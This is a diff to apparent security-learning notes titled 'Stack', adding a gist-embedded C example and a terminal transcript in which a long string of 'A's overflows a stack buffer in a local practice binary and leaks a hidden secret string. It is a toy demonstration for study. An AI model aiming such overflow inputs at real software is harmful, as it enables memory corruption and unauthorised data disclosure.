@@ -1,5 +1,19 @@
 # Stack 
 
-.
-<script src="https://gist.github.com/n41n4/496691de46d5202aec5585a722763ffa.js"></script>
+Example:
+
+<script src="https://gist.github.com/n41n4/496691de46d5202aec5585a722763ffa.js?file=snippet.c"></script>
+
+Exploit:
+
+```bash
+inc0gn1t0@inc0gn1t0-VirtualBox:~/Redacted$ ./secret 
+Guest
+Welcome Guest
+
+inc0gn1t0@inc0gn1t0-VirtualBox:~/Redacted$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./secret 
+Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASup3r_S3cr37_S7r1n6
+
+
+```
 
